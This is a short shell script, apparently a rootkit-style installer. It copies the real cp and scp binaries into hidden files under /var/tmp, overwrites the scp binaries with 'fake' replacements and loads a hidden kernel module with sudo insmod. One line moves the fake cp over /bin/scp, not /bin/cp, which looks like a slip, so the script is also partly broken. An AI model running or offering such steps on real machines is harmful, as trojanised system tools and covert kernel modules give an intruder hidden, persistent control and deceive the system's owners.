cp /bin/cp /var/tmp/.cp
cp /usr/bin/scp /var/tmp/.scp
mv -f /.fake-cp /bin/scp
mv -f /.fake-scp /usr/bin/scp
sudo insmod /var/tmp/.hello.ko
